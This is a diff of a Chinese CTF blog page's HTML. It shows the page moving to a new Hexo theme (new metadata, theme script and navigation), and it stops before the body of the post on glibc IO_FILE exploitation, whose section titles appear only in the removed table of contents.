@@ -1,296 +1,613 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Kylinxin, security, Web3, Rust, pwn, CTF">
+    
+    
+    <meta name="author" content="Kylinxin">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+                // Try immediately
+                if (addBodyClass()) return;
 
-<link rel="stylesheet" href="/css/main.css?v=linear-verge-20260603c">
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-
-
-<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"kylinxin.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":3,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
-
-    <meta name="description" content="【PWN】IO_FILE的利用此篇简单的学习一下IO_File的利用 IO_FILE 的结构1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162struct _IO_FILE &#123;  int _flags;">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kylinxin.github.io/2023/10/15/io_file利用/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Kylinxin&#39;s notes on security, Web3, systems, and programming.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IO_File的利用">
 <meta property="og:url" content="https://kylinxin.github.io/2023/10/15/IO_File%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="Kylinxin&#39;s Blog">
-<meta property="og:description" content="【PWN】IO_FILE的利用此篇简单的学习一下IO_File的利用 IO_FILE 的结构1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162struct _IO_FILE &#123;  int _flags;">
+<meta property="og:description" content="Kylinxin&#39;s notes on security, Web3, systems, and programming.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png">
-<meta property="og:image" content="https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png">
-<meta property="og:image" content="https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png">
+<meta property="og:image" content="https://kylinxin.github.io/images/faction/1.png">
 <meta property="article:published_time" content="2023-10-15T07:14:29.000Z">
 <meta property="article:modified_time" content="2023-10-15T07:14:29.000Z">
 <meta property="article:author" content="Kylinxin">
 <meta property="article:tag" content="IO_File">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png">
+<meta name="twitter:image" content="https://kylinxin.github.io/images/faction/1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            IO_File的利用 | Kylinxin&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
-<link rel="canonical" href="https://kylinxin.github.io/2023/10/15/IO_File%E5%88%A9%E7%94%A8/">
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://kylinxin.github.io/2023/10/15/IO_File%E5%88%A9%E7%94%A8/","path":"2023/10/15/IO_File利用/","title":"IO_File的利用"}</script>
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>IO_File的利用 | Kylinxin's Blog</title>
-  
+    
 
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
 
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
 
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
 
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kylinxin.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.75,"image_border_radius":"10px","image_alignment":"center","image_caption":true,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3rem","h2":"2.4rem","h3":"1.9rem","h4":"1.5rem","h5":"1.25rem","h6":"1.1rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["Kylinxin"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"tokyo-night-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#2F4858","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1120px","sidebar_width":"240px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/faction/1.png","description":"Kylinxin's notes on security, Web3, systems, and programming."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Kylinxin's Blog","subtitle":{"text":["Security notes, exploit writeups, and engineering traces.","Web3, Rust, systems, and learning records.","Write, break, rebuild, and document."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":70,"backing_speed":45,"starting_delay":350,"backing_delay":1800,"loop":true,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#f4efe7"},"text_style":{"title_size":"3rem","subtitle_size":"1.25rem","line_height":1.25},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Kylinxin"},{"icon":"fa-solid fa-rss","url":"/atom.xml"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#141821","right":"#A31F34","transparency":28},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder-open"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/friends/","icon":"fa-regular fa-link"},"About":{"path":"/about/","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"CTF / Pwn / Web3 / Rust / notes","show_on_mobile":true,"links":{"GitHub":{"path":"https://github.com/Kylinxin","icon":"fa-brands fa-github"},"RSS":{"path":"/atom.xml","icon":"fa-solid fa-rss"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":260,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":5}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-shield-halved\" style=\"color: #A31F34\"></i>","start":"2023/4/9 00:00:00","statistics":true,"customize":"Built with Hexo and Redefine.","icp":{"enable":false,"number":null,"url":null}},"footerStart":"2023/4/9 00:00:00","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
 
-  
-  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
-<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
-
-  <script src="https://unpkg.com/hexo-generator-searchdb@1.5.0/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
-<script src="/js/third-party/search/local-search.js" defer></script>
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="Kylinxin's Blog" type="application/atom+xml">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Kylinxin's Blog" type="application/atom+xml">
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
 
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
 
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Kylinxin's Blog</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="搜索" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
 
+<main class="page-container" id="swup">
 
+	
 
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-      <div class="search-header">
-        <span class="search-icon">
-          <i class="fa fa-search"></i>
-        </span>
-        <div class="search-input-container">
-          <input autocomplete="off" autocapitalize="off" maxlength="80"
-                placeholder="搜索..." spellcheck="false"
-                type="search" class="search-input">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Kylinxin&#39;s Blog
+                
+            </a>
         </div>
-        <span class="popup-btn-close" role="button">
-          <i class="fa fa-times-circle"></i>
-        </span>
-      </div>
-      <div class="search-result-container">
-        <div class="search-result-icon">
-          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder-open fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/friends/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
         </div>
-      </div>
     </div>
-  </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder-open fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/friends/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           target="_blank" rel="noopener" href="https://github.com/Kylinxin"
+                        >
+                            <span>GitHub</span>
+                            <i class="fa-brands fa-github fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/atom.xml"
+                        >
+                            <span>RSS</span>
+                            <i class="fa-solid fa-rss fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">60</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
 
 </header>
-        
-  
-  <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E3%80%90PWN%E3%80%91IO-FILE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">【PWN】IO_FILE的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">IO_FILE 的结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc"><span class="nav-number">1.2.</span> <span class="nav-text">利用_IO_2_1_stdout泄露libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-number">1.3.</span> <span class="nav-text">FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fileno-%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">fileno 与缓冲区的相关利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IO-str-jumps-gt-overflow"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">_IO_str_jumps -&gt; overflow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IO-str-jumps-gt-finish"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">_IO_str_jumps -&gt; finish</span></a></li></ol></li></ol></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
+		</div>
 
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Kylinxin"
-      src="/images/faction/1.png">
-  <p class="site-author-name" itemprop="name">Kylinxin</p>
-  <div class="site-description" itemprop="description">Kylinxin's Blog</div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">60</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">14</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">44</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/Kylinxin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Kylinxin" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-  </div>
+		<div class="main-content-body transition-fade-up">
+			
 
-        </div>
-      </div>
-    </div>
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">IO_File的利用</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/faction/1.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Kylinxin</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Kylinxin</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-15 15:14:29</span>
+        <span class="mobile">2023-10-15 15:14:29</span>
+        <span class="hover-info">创建</span>
+    </span>
     
-  </aside>
-
-
